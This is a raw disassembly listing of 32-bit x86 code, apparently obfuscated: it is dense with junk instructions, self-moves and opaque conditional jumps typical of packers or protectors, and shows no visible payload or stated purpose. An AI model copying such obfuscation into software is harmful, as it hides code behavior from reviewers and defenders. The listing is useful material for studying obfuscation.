  40a438:	88 ee                	mov    %ch,%dh
  40a43a:	1d 9e 76 0d 1a       	sbb    $0x1a0d769e,%eax
  40a43f:	87 f5                	xchg   %esi,%ebp
  40a441:	80 e0 40             	and    $0x40,%al
  40a444:	f3 0f be f6          	repz movsbl %dh,%esi
  40a448:	81 cf 60 78 43 df    	or     $0xdf437860,%edi
  40a44e:	ff ce                	dec    %esi
  40a450:	0d 01 89 2e 16       	or     $0x162e8901,%eax
  40a455:	48                   	dec    %eax
  40a456:	8b f2                	mov    %edx,%esi
  40a458:	86 f6                	xchg   %dh,%dh
  40a45a:	81 dd 17 a1 cc ae    	sbb    $0xaecca117,%ebp
  40a460:	f3 8d 15 24 e5 0e 6c 	repz lea 0x6c0ee524,%edx
  40a467:	ff c5                	inc    %ebp
  40a469:	0f af e8             	imul   %eax,%ebp
  40a46c:	51                   	push   %ecx
  40a46d:	45                   	inc    %ebp
  40a46e:	03 d0                	add    %eax,%edx
  40a470:	5f                   	pop    %edi
  40a471:	45                   	inc    %ebp
  40a472:	89 fe                	mov    %edi,%esi
  40a474:	8b c7                	mov    %edi,%eax
  40a476:	0f af ea             	imul   %edx,%ebp
  40a479:	87 f6                	xchg   %esi,%esi
  40a47b:	89 f6                	mov    %esi,%esi
  40a47d:	0f af f2             	imul   %edx,%esi
  40a480:	86 f6                	xchg   %dh,%dh
  40a482:	50                   	push   %eax
  40a483:	69 ee 71 3a 4f 1a    	imul   $0x1a4f3a71,%esi,%ebp
  40a489:	0f b7 d3             	movzwl %bx,%edx
  40a48c:	f6 c6 98             	test   $0x98,%dh
  40a48f:	5b                   	pop    %ebx
  40a490:	80 f2 95             	xor    $0x95,%dl
  40a493:	0f af c2             	imul   %edx,%eax
  40a496:	41                   	inc    %ecx
  40a497:	88 dd                	mov    %bl,%ch
  40a499:	69 c1 f6 22 fd f2    	imul   $0xf2fd22f6,%ecx,%eax
  40a49f:	25 75 0c dc d7       	and    $0xd7dc0c75,%eax
  40a4a4:	69 f1 d1 1f ec 99    	imul   $0x99ec1fd1,%ecx,%esi
  40a4aa:	81 c3 10 00 00 00    	add    $0x10,%ebx
  40a4b0:	f3 69 e8 e9 8f 41 d6 	repz imul $0xd6418fe9,%eax,%ebp
  40a4b7:	53                   	push   %ebx
  40a4b8:	8d 0d 50 25 a4 06    	lea    0x6a42550,%ecx
  40a4be:	8d 0d 2a 88 98 02    	lea    0x298882a,%ecx
  40a4c4:	48                   	dec    %eax
  40a4c5:	87 cd                	xchg   %ecx,%ebp
  40a4c7:	85 ee                	test   %ebp,%esi
  40a4c9:	88 dd                	mov    %bl,%ch
  40a4cb:	0f af d0             	imul   %eax,%edx
  40a4ce:	03 c6                	add    %esi,%eax
  40a4d0:	8a c1                	mov    %cl,%al
  40a4d2:	8b f3                	mov    %ebx,%esi
  40a4d4:	f6 c5 9d             	test   $0x9d,%ch
  40a4d7:	19 ea                	sbb    %ebp,%edx
  40a4d9:	c6 c5 6b             	mov    $0x6b,%ch
  40a4dc:	30 c3                	xor    %al,%bl
  40a4de:	04 ae                	add    $0xae,%al
  40a4e0:	03 db                	add    %ebx,%ebx
  40a4e2:	42                   	inc    %edx
  40a4e3:	89 d7                	mov    %edx,%edi
  40a4e5:	89 f7                	mov    %esi,%edi
  40a4e7:	13 de                	adc    %esi,%ebx
  40a4e9:	69 d3 af 95 09 c9    	imul   $0xc90995af,%ebx,%edx
  40a4ef:	0f bf d3             	movswl %bx,%edx
  40a4f2:	ff cd                	dec    %ebp
  40a4f4:	43                   	inc    %ebx
  40a4f5:	bf 05 07 00 00       	mov    $0x705,%edi
  40a4fa:	69 d2 e3 bb 6b 4b    	imul   $0x4b6bbbe3,%edx,%edx
  40a500:	69 d7 c7 01 cb b4    	imul   $0xb4cb01c7,%edi,%edx
  40a506:	80 d6 16             	adc    $0x16,%dh
  40a509:	81 f7 45 07 00 00    	xor    $0x745,%edi
  40a50f:	f7 c5 80 dd fb 12    	test   $0x12fbdd80,%ebp
  40a515:	6b ff 07             	imul   $0x7,%edi,%edi
  40a518:	78 02                	js     0x40a51c
  40a51a:	2a d1                	sub    %cl,%dl
  40a51c:	8d 0f                	lea    (%edi),%ecx
  40a51e:	0b db                	or     %ebx,%ebx
  40a520:	81 f1 c9 01 00 00    	xor    $0x1c9,%ecx
  40a526:	69 f9 54 67 e5 ee    	imul   $0xeee56754,%ecx,%edi
  40a52c:	8b c1                	mov    %ecx,%eax
  40a52e:	f2 8b e9             	repnz mov %ecx,%ebp
  40a531:	69 c0 9c 00 00 00    	imul   $0x9c,%eax,%eax
  40a537:	0f bf eb             	movswl %bx,%ebp
  40a53a:	0f c1 c6             	xadd   %eax,%esi
  40a53d:	ff cf                	dec    %edi
  40a53f:	81 c6 24 0b 00 00    	add    $0xb24,%esi
  40a545:	56                   	push   %esi
  40a546:	c7 c6 85 8c 48 fb    	mov    $0xfb488c85,%esi
  40a54c:	28 c5                	sub    %al,%ch
  40a54e:	87 f1                	xchg   %esi,%ecx
  40a550:	6a 00                	push   $0x0
  40a552:	5a                   	pop    %edx
  40a553:	25 10 1f fc 7e       	and    $0x7efc1f10,%eax
  40a558:	ff cd                	dec    %ebp
  40a55a:	69 c7 f9 94 ef 66    	imul   $0x66ef94f9,%edi,%eax
  40a560:	f7 c7 b5 a2 a1 fa    	test   $0xfaa1a2b5,%edi
  40a566:	ff c7                	inc    %edi
  40a568:	86 ed                	xchg   %ch,%ch
  40a56a:	84 d3                	test   %dl,%bl
  40a56c:	81 c0 3f ea 14 19    	add    $0x1914ea3f,%eax
  40a572:	88 f5                	mov    %dh,%ch
  40a574:	68 3f 00 00 00       	push   $0x3f
  40a579:	14 14                	adc    $0x14,%al
  40a57b:	21 f9                	and    %edi,%ecx
  40a57d:	84 c6                	test   %al,%dh
  40a57f:	5b                   	pop    %ebx
  40a580:	c7 c5 88 44 89 57    	mov    $0x57894488,%ebp
  40a586:	72 02                	jb     0x40a58a
  40a588:	b4 6d                	mov    $0x6d,%ah
  40a58a:	b8 4c 94 06 6a       	mov    $0x6a06944c,%eax
  40a58f:	ff c6                	inc    %esi
  40a591:	f7 c6 55 37 5f d0    	test   $0xd05f3755,%esi
  40a597:	48                   	dec    %eax
  40a598:	89 d8                	mov    %ebx,%eax
  40a59a:	b8 08 b4 b0 27       	mov    $0x27b0b408,%eax
  40a59f:	89 d6                	mov    %edx,%esi
  40a5a1:	81 fe e4 92 00 00    	cmp    $0x92e4,%esi
  40a5a7:	73 08                	jae    0x40a5b1
  40a5a9:	ff c8                	dec    %eax
  40a5ab:	69 c0 82 04 92 dc    	imul   $0xdc920482,%eax,%eax
  40a5b1:	71 09                	jno    0x40a5bc
  40a5b3:	40                   	inc    %eax
  40a5b4:	ff c8                	dec    %eax
  40a5b6:	8d 05 f9 61 a8 a6    	lea    0xa6a861f9,%eax
  40a5bc:	8b f3                	mov    %ebx,%esi
  40a5be:	0f b7 c0             	movzwl %ax,%eax
  40a5c1:	69 c5 e1 eb e8 9b    	imul   $0x9be8ebe1,%ebp,%eax
  40a5c7:	f2 32 c0             	repnz xor %al,%al
  40a5ca:	21 f0                	and    %esi,%eax
  40a5cc:	8d 0e                	lea    (%esi),%ecx
  40a5ce:	3d 22 c0 83 ee       	cmp    $0xee83c022,%eax
  40a5d3:	69 c5 1b 00 10 38    	imul   $0x3810001b,%ebp,%eax
  40a5d9:	0f b7 c7             	movzwl %di,%eax
  40a5dc:	69 f3 e0 a1 56 2d    	imul   $0x2d56a1e0,%ebx,%esi
  40a5e2:	8b e9                	mov    %ecx,%ebp
  40a5e4:	f7 c7 27 98 2f aa    	test   $0xaa2f9827,%edi
  40a5ea:	8d 35 fd 47 0a 1a    	lea    0x1a0a47fd,%esi
  40a5f0:	b5 4e                	mov    $0x4e,%ch
  40a5f2:	0f bf ca             	movswl %dx,%ecx
  40a5f5:	84 d9                	test   %bl,%cl
  40a5f7:	8b fd                	mov    %ebp,%edi
  40a5f9:	87 c1                	xchg   %eax,%ecx
  40a5fb:	88 c0                	mov    %al,%al
  40a5fd:	83 e7 01             	and    $0x1,%edi
  40a600:	b8 cf 7f 20 f2       	mov    $0xf2207fcf,%eax
  40a605:	c1 e7 01             	shl    $0x1,%edi
  40a608:	69 ed 4c 76 7d 42    	imul   $0x427d764c,%ebp,%ebp
  40a60e:	c1 e7 01             	shl    $0x1,%edi
  40a611:	f7 c1 66 ff ed 10    	test   $0x10edff66,%ecx
  40a617:	25 f6 4d 08 73       	and    $0x73084df6,%eax
  40a61c:	c6 c0 9b             	mov    $0x9b,%al
  40a61f:	09 d6                	or     %edx,%esi
  40a621:	41                   	inc    %ecx
  40a622:	0f be f3             	movsbl %bl,%esi
  40a625:	3a c6                	cmp    %dh,%al
  40a627:	8d 0d 83 79 9c c6    	lea    0xc69c7983,%ecx
  40a62d:	0a ed                	or     %ch,%ch
  40a62f:	b8 83 16 c2 f8       	mov    $0xf8c21683,%eax
  40a634:	69 c6 60 5c 99 7f    	imul   $0x7f995c60,%esi,%eax
  40a63a:	0f b7 f0             	movzwl %ax,%esi
  40a63d:	c7 c6 9c 6d a1 00    	mov    $0xa16d9c,%esi
  40a643:	8d 02                	lea    (%edx),%eax
  40a645:	eb 11                	jmp    0x40a658
  40a647:	f7 c1 a0 4b c6 09    	test   $0x9c64ba0,%ecx
  40a64d:	69 f6 bf 80 a1 85    	imul   $0x85a180bf,%esi,%esi
  40a653:	be 61 66 f4 86       	mov    $0x86f46661,%esi
  40a658:	81 fa d3 e7 00 00    	cmp    $0xe7d3,%edx
  40a65e:	71 01                	jno    0x40a661
  40a660:	46                   	inc    %esi
  40a661:	8d 08                	lea    (%eax),%ecx
  40a663:	85 f2                	test   %esi,%edx
  40a665:	70 06                	jo     0x40a66d
  40a667:	81 d6 1f 28 b6 70    	adc    $0x70b6281f,%esi
  40a66d:	eb 0d                	jmp    0x40a67c
  40a66f:	69 c0 d5 1b e2 11    	imul   $0x11e21bd5,%eax,%eax
  40a675:	85 db                	test   %ebx,%ebx
  40a677:	3d 8d d0 3b 9c       	cmp    $0x9c3bd08d,%eax
  40a67c:	51                   	push   %ecx
  40a67d:	8d 05 b2 ad 3c 0c    	lea    0xc3cadb2,%eax
  40a683:	0f af c0             	imul   %eax,%eax
  40a686:	5d                   	pop    %ebp
  40a687:	08 d8                	or     %bl,%al
  40a689:	4e                   	dec    %esi
  40a68a:	48                   	dec    %eax
  40a68b:	03 fd                	add    %ebp,%edi
  40a68d:	0f b7 c7             	movzwl %di,%eax
  40a690:	03 3c 24             	add    (%esp),%edi
  40a693:	0f af f5             	imul   %ebp,%esi
  40a696:	69 c2 ea 4d b0 d7    	imul   $0xd7b04dea,%edx,%eax
  40a69c:	c7 c0 fb a6 13 6d    	mov    $0x6d13a6fb,%eax
  40a6a2:	52                   	push   %edx
  40a6a3:	0f b6 ce             	movzbl %dh,%ecx
  40a6a6:	69 d0 35 f2 72 2c    	imul   $0x2c72f235,%eax,%edx
  40a6ac:	89 d2                	mov    %edx,%edx
  40a6ae:	ff c9                	dec    %ecx
  40a6b0:	4e                   	dec    %esi
  40a6b1:	8b 2f                	mov    (%edi),%ebp
  40a6b3:	72 01                	jb     0x40a6b6
  40a6b5:	f3 86 f5             	repz xchg %dh,%ch
  40a6b8:	bf 99 aa 83 65       	mov    $0x6583aa99,%edi
  40a6bd:	25 d3 c4 68 ee       	and    $0xee68c4d3,%eax
  40a6c2:	c7 c2 c5 47 da 0c    	mov    $0xcda47c5,%edx
  40a6c8:	8d 05 4f dd cb c1    	lea    0xc1cbdd4f,%eax
  40a6ce:	0f bf d5             	movswl %bp,%edx
  40a6d1:	8d 75 00             	lea    0x0(%ebp),%esi
  40a6d4:	85 d0                	test   %edx,%eax
  40a6d6:	76 08                	jbe    0x40a6e0
  40a6d8:	ba 09 16 f8 5a       	mov    $0x5af81609,%edx
  40a6dd:	0f b7 d5             	movzwl %bp,%edx
  40a6e0:	85 eb                	test   %ebp,%ebx
  40a6e2:	69 fe 73 8a e8 51    	imul   $0x51e88a73,%esi,%edi
  40a6e8:	55                   	push   %ebp
  40a6e9:	0a c1                	or     %cl,%al
  40a6eb:	23 cd                	and    %ebp,%ecx
  40a6ed:	c1 e5 01             	shl    $0x1,%ebp
  40a6f0:	19 e9                	sbb    %ebp,%ecx
  40a6f2:	89 ea                	mov    %ebp,%edx
  40a6f4:	c1 e5 01             	shl    $0x1,%ebp
  40a6f7:	f3 6b ed 02          	repz imul $0x2,%ebp,%ebp
  40a6fb:	fe c8                	dec    %al
  40a6fd:	6b ed 02             	imul   $0x2,%ebp,%ebp
  40a700:	8a cc                	mov    %ah,%cl
  40a702:	87 c1                	xchg   %eax,%ecx
  40a704:	0f af d7             	imul   %edi,%edx
  40a707:	c1 e5 01             	shl    $0x1,%ebp
  40a70a:	8b cd                	mov    %ebp,%ecx
  40a70c:	8d 05 d9 02 c8 77    	lea    0x77c802d9,%eax
  40a712:	87 f8                	xchg   %edi,%eax
  40a714:	c1 e5 01             	shl    $0x1,%ebp
  40a717:	c7 c2 76 f7 7d 63    	mov    $0x637df776,%edx
  40a71d:	4f                   	dec    %edi
  40a71e:	c1 ee 02             	shr    $0x2,%esi
  40a721:	0f b6 fb             	movzbl %bl,%edi
  40a724:	c1 ee 01             	shr    $0x1,%esi
  40a727:	ff c7                	inc    %edi
  40a729:	c1 ee 02             	shr    $0x2,%esi
  40a72c:	88 e0                	mov    %ah,%al
  40a72e:	0f af ce             	imul   %esi,%ecx
  40a731:	81 f1 e3 f4 21 54    	xor    $0x5421f4e3,%ecx
  40a737:	c1 ee 02             	shr    $0x2,%esi
  40a73a:	fe c2                	inc    %dl
  40a73c:	f2 c1 ee 01          	repnz shr $0x1,%esi
  40a740:	85 e8                	test   %ebp,%eax
  40a742:	71 0f                	jno    0x40a753
  40a744:	69 d1 c5 2f ae ae    	imul   $0xaeae2fc5,%ecx,%edx
  40a74a:	0f af d1             	imul   %ecx,%edx
  40a74d:	8d 0d 53 0f b0 91    	lea    0x91b00f53,%ecx
  40a753:	4a                   	dec    %edx
  40a754:	87 d7                	xchg   %edx,%edi
  40a756:	18 c6                	sbb    %al,%dh
  40a758:	11 ea                	adc    %ebp,%edx
  40a75a:	0f b7 cb             	movzwl %bx,%ecx
  40a75d:	81 f2 b4 05 24 01    	xor    $0x12405b4,%edx
  40a763:	0f be ff             	movsbl %bh,%edi
  40a766:	c6 c6 7e             	mov    $0x7e,%dh
  40a769:	0f af d0             	imul   %eax,%edx
  40a76c:	8d 0e                	lea    (%esi),%ecx
  40a76e:	f6 c0 76             	test   $0x76,%al
  40a771:	fe c6                	inc    %dh
  40a773:	b8 fd e0 e6 d4       	mov    $0xd4e6e0fd,%eax
  40a778:	81 f0 80 92 80 6e    	xor    $0x6e809280,%eax
  40a77e:	f7 c7 4d 4a b2 e9    	test   $0xe9b24a4d,%edi
  40a784:	33 e9                	xor    %ecx,%ebp
  40a786:	86 c6                	xchg   %al,%dh
  40a788:	69 fa f2 02 ef 4f    	imul   $0x4fef02f2,%edx,%edi
  40a78e:	80 de 62             	sbb    $0x62,%dh
  40a791:	5e                   	pop    %esi
  40a792:	85 c0                	test   %eax,%eax
  40a794:	74 02                	je     0x40a798
  40a796:	86 c2                	xchg   %al,%dl
  40a798:	f7 c0 16 6a d4 83    	test   $0x83d46a16,%eax
  40a79e:	85 d5                	test   %edx,%ebp
  40a7a0:	89 ef                	mov    %ebp,%edi
  40a7a2:	69 d2 88 b7 72 d2    	imul   $0xd272b788,%edx,%edx
  40a7a8:	c6 c2 c0             	mov    $0xc0,%dl
  40a7ab:	8a c2                	mov    %dl,%al
  40a7ad:	b8 bc ec 64 c6       	mov    $0xc664ecbc,%eax
  40a7b2:	eb 02                	jmp    0x40a7b6
  40a7b4:	ff c1                	inc    %ecx
  40a7b6:	8d 4d 00             	lea    0x0(%ebp),%ecx
  40a7b9:	8d 01                	lea    (%ecx),%eax
  40a7bb:	3d 92 5b 00 00       	cmp    $0x5b92,%eax
  40a7c0:	70 02                	jo     0x40a7c4
  40a7c2:	86 c9                	xchg   %cl,%cl
  40a7c4:	50                   	push   %eax
  40a7c5:	87 c9                	xchg   %ecx,%ecx
  40a7c7:	49                   	dec    %ecx
  40a7c8:	5a                   	pop    %edx
  40a7c9:	0f af cf             	imul   %edi,%ecx
  40a7cc:	28 dd                	sub    %bl,%ch
  40a7ce:	c6 c1 d1             	mov    $0xd1,%cl
  40a7d1:	85 f0                	test   %esi,%eax
  40a7d3:	72 08                	jb     0x40a7dd
  40a7d5:	81 e0 9e 95 d3 f1    	and    $0xf1d3959e,%eax
  40a7db:	39 c0                	cmp    %eax,%eax
  40a7dd:	52                   	push   %edx
  40a7de:	86 cc                	xchg   %cl,%ah
  40a7e0:	5f                   	pop    %edi
  40a7e1:	85 f5                	test   %esi,%ebp
  40a7e3:	71 04                	jno    0x40a7e9
  40a7e5:	89 c0                	mov    %eax,%eax
  40a7e7:	8a e2                	mov    %dl,%ah
  40a7e9:	b1 b7                	mov    $0xb7,%cl
  40a7eb:	f7 c2 2e ad e9 c1    	test   $0xc1e9ad2e,%edx
  40a7f1:	03 f7                	add    %edi,%esi
  40a7f3:	1c b0                	sbb    $0xb0,%al
  40a7f5:	08 d6                	or     %dl,%dh
  40a7f7:	5a                   	pop    %edx
  40a7f8:	c6 c5 6a             	mov    $0x6a,%ch
  40a7fb:	69 fd 76 18 e3 b2    	imul   $0xb2e31876,%ebp,%edi
  40a801:	88 fc                	mov    %bh,%ah
  40a803:	0f af fa             	imul   %edx,%edi
  40a806:	ff c0                	inc    %eax
  40a808:	03 f2                	add    %edx,%esi
  40a80a:	85 d0                	test   %edx,%eax
  40a80c:	74 06                	je     0x40a814
  40a80e:	8d 3d 2e f0 c2 4f    	lea    0x4fc2f02e,%edi
  40a814:	69 fd e6 0d 99 0c    	imul   $0xc990de6,%ebp,%edi
  40a81a:	86 e0                	xchg   %ah,%al
  40a81c:	fe cd                	dec    %ch
  40a81e:	8b fb                	mov    %ebx,%edi
  40a820:	8d 3d 5d a2 98 95    	lea    0x9598a25d,%edi
  40a826:	8d 0d 5f 6c c8 29    	lea    0x29c86c5f,%ecx
  40a82c:	f7 c3 21 99 e5 5b    	test   $0x5be59921,%ebx
  40a832:	81 df 4e 76 e1 e4    	sbb    $0xe4e1764e,%edi
  40a838:	8d 0d 2c f4 f9 ff    	lea    0xfff9f42c,%ecx
  40a83e:	85 c8                	test   %ecx,%eax
  40a840:	8d 3d 2e 56 d5 7d    	lea    0x7dd5562e,%edi
  40a846:	47                   	inc    %edi
  40a847:	81 c1 e8 e3 06 00    	add    $0x6e3e8,%ecx
  40a84d:	0f bf fe             	movswl %si,%edi
  40a850:	91                   	xchg   %eax,%ecx
  40a851:	29 f7                	sub    %esi,%edi
  40a853:	0f b7 f9             	movzwl %cx,%edi
  40a856:	05 07 0e 00 00       	add    $0xe07,%eax
  40a85b:	89 ff                	mov    %edi,%edi
  40a85d:	c7 c7 a1 22 31 42    	mov    $0x423122a1,%edi
  40a863:	0f af fd             	imul   %ebp,%edi
  40a866:	0f c1 c6             	xadd   %eax,%esi
  40a869:	8d 3d 67 22 75 f2    	lea    0xf2752267,%edi
  40a86f:	87 cf                	xchg   %ecx,%edi
  40a871:	86 ed                	xchg   %ch,%ch
  40a873:	ff cf                	dec    %edi
  40a875:	81 f1 01 1b cc ec    	xor    $0xeccc1b01,%ecx
  40a87b:	03 fb                	add    %ebx,%edi
  40a87d:	bf ac cf 0d 77       	mov    $0x770dcfac,%edi
  40a882:	69 fa 61 e1 e1 6a    	imul   $0x6ae1e161,%edx,%edi
  40a888:	86 c8                	xchg   %cl,%al
  40a88a:	f2 0f be cc          	repnz movsbl %ah,%ecx
  40a88e:	41                   	inc    %ecx
  40a88f:	f6 c0 6c             	test   $0x6c,%al
  40a892:	8b c3                	mov    %ebx,%eax
  40a894:	f2 80 f5 2d          	repnz xor $0x2d,%ch
  40a898:	8d 0d 9a 0c 57 28    	lea    0x28570c9a,%ecx
  40a89e:	8d 3d 45 ad 30 e9    	lea    0xe930ad45,%edi
  40a8a4:	8b e8                	mov    %eax,%ebp
  40a8a6:	88 fd                	mov    %bh,%ch
  40a8a8:	87 f9                	xchg   %edi,%ecx
  40a8aa:	83 e5 07             	and    $0x7,%ebp
  40a8ad:	ff c1                	inc    %ecx
  40a8af:	8b cb                	mov    %ebx,%ecx
  40a8b1:	86 e8                	xchg   %ch,%al
  40a8b3:	c7 c0 03 5e 75 92    	mov    $0x92755e03,%eax
  40a8b9:	75 07                	jne    0x40a8c2
  40a8bb:	0f be fd             	movsbl %ch,%edi
  40a8be:	40                   	inc    %eax
  40a8bf:	0f af c0             	imul   %eax,%eax
  40a8c2:	71 06                	jno    0x40a8ca
  40a8c4:	c7 c7 ca 9a f5 06    	mov    $0x6f59aca,%edi
  40a8ca:	03 ed                	add    %ebp,%ebp
  40a8cc:	b1 b1                	mov    $0xb1,%cl
  40a8ce:	81 f7 f5 4e 7c 3a    	xor    $0x3a7c4ef5,%edi
  40a8d4:	8d 3d 93 10 73 d1    	lea    0xd1731093,%edi
  40a8da:	39 c1                	cmp    %eax,%ecx
  40a8dc:	c6 c4 60             	mov    $0x60,%ah
  40a8df:	c7 c0 19 a4 84 5f    	mov    $0x5f84a419,%eax
  40a8e5:	8a c3                	mov    %bl,%al
  40a8e7:	35 1d 06 5e 1d       	xor    $0x1d5e061d,%eax
  40a8ec:	34 85                	xor    $0x85,%al
  40a8ee:	87 f8                	xchg   %edi,%eax
  40a8f0:	8d 0d 8b 8c 7e ba    	lea    0xba7e8c8b,%ecx
  40a8f6:	f3 8a e6             	repz mov %dh,%ah
  40a8f9:	c7 c0 11 3c b0 d4    	mov    $0xd4b03c11,%eax
  40a8ff:	f2 8b c5             	repnz mov %ebp,%eax
  40a902:	50                   	push   %eax
  40a903:	59                   	pop    %ecx
  40a904:	1d ad 3d 0b 9e       	sbb    $0x9e0b3dad,%eax
  40a909:	8d 39                	lea    (%ecx),%edi
  40a90b:	0b c3                	or     %ebx,%eax
  40a90d:	f6 c1 65             	test   $0x65,%cl
  40a910:	18 c0                	sbb    %al,%al
  40a912:	14 84                	adc    $0x84,%al
  40a914:	8b c8                	mov    %eax,%ecx
  40a916:	03 ef                	add    %edi,%ebp
  40a918:	85 e8                	test   %ebp,%eax
  40a91a:	f3 f2 09 e9          	repz repnz or %ebp,%ecx
  40a91e:	b0 5e                	mov    $0x5e,%al
  40a920:	15 cd c0 31 24       	adc    $0x2431c0cd,%eax
  40a925:	8b cf                	mov    %edi,%ecx
  40a927:	8b ff                	mov    %edi,%edi
  40a929:	2a ee                	sub    %dh,%ch
  40a92b:	83 c4 04             	add    $0x4,%esp
  40a92e:	f3 8b c3             	repz mov %ebx,%eax
  40a931:	03 2c 24             	add    (%esp),%ebp
  40a934:	f7 c0 ad a6 96 6e    	test   $0x6e96a6ad,%eax
  40a93a:	86 cd                	xchg   %cl,%ch
  40a93c:	83 ec 04             	sub    $0x4,%esp
  40a93f:	8b c6                	mov    %esi,%eax
  40a941:	0a e9                	or     %cl,%ch
  40a943:	c7 c1 2d 14 9b 13    	mov    $0x139b142d,%ecx
  40a949:	29 e9                	sub    %ebp,%ecx
  40a94b:	fe c9                	dec    %cl
  40a94d:	0f af c3             	imul   %ebx,%eax
  40a950:	03 75 00             	add    0x0(%ebp),%esi
  40a953:	ff c1                	inc    %ecx
  40a955:	ff c0                	inc    %eax
  40a957:	76 0b                	jbe    0x40a964
  40a959:	0f af cf             	imul   %edi,%ecx
  40a95c:	2c 1e                	sub    $0x1e,%al
  40a95e:	c7 c1 26 e0 1c 22    	mov    $0x221ce026,%ecx
  40a964:	0d fb 53 db e6       	or     $0xe6db53fb,%eax
  40a969:	c6 c4 b2             	mov    $0xb2,%ah
  40a96c:	0f af c6             	imul   %esi,%eax
  40a96f:	fe c0                	inc    %al
  40a971:	0f af c0             	imul   %eax,%eax
  40a974:	3d 92 60 00 00       	cmp    $0x6092,%eax
  40a979:	74 05                	je     0x40a980
  40a97b:	86 c0                	xchg   %al,%al
  40a97d:	f6 c0 8c             	test   $0x8c,%al
  40a980:	bf 00 00 00 00       	mov    $0x0,%edi
  40a985:	87 c0                	xchg   %eax,%eax
  40a987:	33 fb                	xor    %ebx,%edi
  40a989:	38 cc                	cmp    %cl,%ah
  40a98b:	c7 c0 2f 37 03 bb    	mov    $0xbb03372f,%eax
  40a991:	14 93                	adc    $0x93,%al
  40a993:	81 d0 73 d9 a3 95    	adc    $0x95a3d973,%eax
  40a999:	8b cf                	mov    %edi,%ecx
  40a99b:	70 02                	jo     0x40a99f
  40a99d:	01 d8                	add    %ebx,%eax
  40a99f:	48                   	dec    %eax
  40a9a0:	0c e7                	or     $0xe7,%al
  40a9a2:	89 c8                	mov    %ecx,%eax
  40a9a4:	03 f1                	add    %ecx,%esi
  40a9a6:	86 e0                	xchg   %ah,%al
  40a9a8:	0f be c1             	movsbl %cl,%eax
  40a9ab:	0f af fa             	imul   %edx,%edi
  40a9ae:	c6 c1 34             	mov    $0x34,%cl
  40a9b1:	b9 ab 8b 65 63       	mov    $0x63658bab,%ecx
  40a9b6:	86 e9                	xchg   %ch,%cl
  40a9b8:	fe c5                	inc    %ch
  40a9ba:	89 d1                	mov    %edx,%ecx
  40a9bc:	8d 03                	lea    (%ebx),%eax
  40a9be:	f2 73 08             	bnd jae 0x40a9c9
  40a9c1:	13 c8                	adc    %eax,%ecx
  40a9c3:	f7 c1 35 59 26 63    	test   $0x63265935,%ecx
  40a9c9:	83 e0 01             	and    $0x1,%eax
  40a9cc:	c7 c7 2f f2 6f 20    	mov    $0x206ff22f,%edi
  40a9d2:	c1 e0 01             	shl    $0x1,%eax
  40a9d5:	0f af c8             	imul   %eax,%ecx
  40a9d8:	6b c0 02             	imul   $0x2,%eax,%eax
  40a9db:	10 e1                	adc    %ah,%cl
  40a9dd:	69 c8 22 a1 0d 95    	imul   $0x950da122,%eax,%ecx
  40a9e3:	f2 70 04             	bnd jo 0x40a9ea
  40a9e6:	29 d1                	sub    %edx,%ecx
  40a9e8:	b5 12                	mov    $0x12,%ch
  40a9ea:	71 04                	jno    0x40a9f0
  40a9ec:	8a ec                	mov    %ah,%ch
  40a9ee:	b1 02                	mov    $0x2,%cl
  40a9f0:	0a cc                	or     %ah,%cl
  40a9f2:	f2 80 d9 3f          	repnz sbb $0x3f,%cl
  40a9f6:	8b c8                	mov    %eax,%ecx
  40a9f8:	2b ff                	sub    %edi,%edi
  40a9fa:	85 ee                	test   %ebp,%esi
  40a9fc:	3b ca                	cmp    %edx,%ecx
  40a9fe:	69 ce 77 fe 0e ad    	imul   $0xad0efe77,%esi,%ecx
  40aa04:	81 f7 99 cb f4 ff    	xor    $0xfff4cb99,%edi
  40aa0a:	18 f1                	sbb    %dh,%cl
  40aa0c:	84 fb                	test   %bh,%bl
  40aa0e:	87 c9                	xchg   %ecx,%ecx
  40aa10:	81 c7 6b 34 0b 00    	add    $0xb346b,%edi
  40aa16:	0f af ca             	imul   %edx,%ecx
  40aa19:	89 f1                	mov    %esi,%ecx
  40aa1b:	33 c7                	xor    %edi,%eax
  40aa1d:	86 ed                	xchg   %ch,%ch
  40aa1f:	f7 c7 69 05 33 59    	test   $0x59330569,%edi
  40aa25:	b9 ae 4f 0a 41       	mov    $0x410a4fae,%ecx
  40aa2a:	0f af cb             	imul   %ebx,%ecx
  40aa2d:	89 f1                	mov    %esi,%ecx
  40aa2f:	85 f0                	test   %esi,%eax
  40aa31:	8d 0a                	lea    (%edx),%ecx
  40aa33:	bf 00 00 00 00       	mov    $0x0,%edi
  40aa38:	0f c1 cf             	xadd   %ecx,%edi
  40aa3b:	8d 0d 14 e8 c9 dd    	lea    0xddc9e814,%ecx
  40aa41:	8d 0d a2 7c 78 5d    	lea    0x5d787ca2,%ecx
  40aa47:	03 c7                	add    %edi,%eax
  40aa49:	8a ce                	mov    %dh,%cl
  40aa4b:	19 d1                	sbb    %edx,%ecx
  40aa4d:	03 04 24             	add    (%esp),%eax
  40aa50:	bf 84 e0 74 e5       	mov    $0xe574e084,%edi
  40aa55:	0f af fa             	imul   %edx,%edi
  40aa58:	86 cd                	xchg   %cl,%ch
  40aa5a:	80 e1 ef             	and    $0xef,%cl
  40aa5d:	8b 28                	mov    (%eax),%ebp
  40aa5f:	f7 c3 05 43 ff 9a    	test   $0x9aff4305,%ebx
  40aa65:	ff c7                	inc    %edi
  40aa67:	c6 c1 fe             	mov    $0xfe,%cl
  40aa6a:	8d 3d 0f 27 f5 c5    	lea    0xc5f5270f,%edi
  40aa70:	84 d4                	test   %dl,%ah
  40aa72:	71 09                	jno    0x40aa7d
  40aa74:	f7 c3 f4 9b ea 78    	test   $0x78ea9bf4,%ebx
  40aa7a:	0f b7 c8             	movzwl %ax,%ecx
  40aa7d:	0f bf ca             	movswl %dx,%ecx
  40aa80:	84 e4                	test   %ah,%ah
  40aa82:	8d 0e                	lea    (%esi),%ecx
  40aa84:	8b f9                	mov    %ecx,%edi
  40aa86:	0f bf ce             	movswl %si,%ecx
  40aa89:	2b ef                	sub    %edi,%ebp
  40aa8b:	c7 c1 60 07 10 23    	mov    $0x23100760,%ecx
  40aa91:	33 cd                	xor    %ebp,%ecx
  40aa93:	0f be c9             	movsbl %cl,%ecx
  40aa96:	fe c9                	dec    %cl
  40aa98:	23 fa                	and    %edx,%edi
  40aa9a:	f3 47                	repz inc %edi
  40aa9c:	89 28                	mov    %ebp,(%eax)
  40aa9e:	84 e5                	test   %ah,%ch
  40aaa0:	f2 87 c9             	repnz xchg %ecx,%ecx
  40aaa3:	84 d9                	test   %bl,%cl
  40aaa5:	69 cb 65 36 28 ea    	imul   $0xea283665,%ebx,%ecx
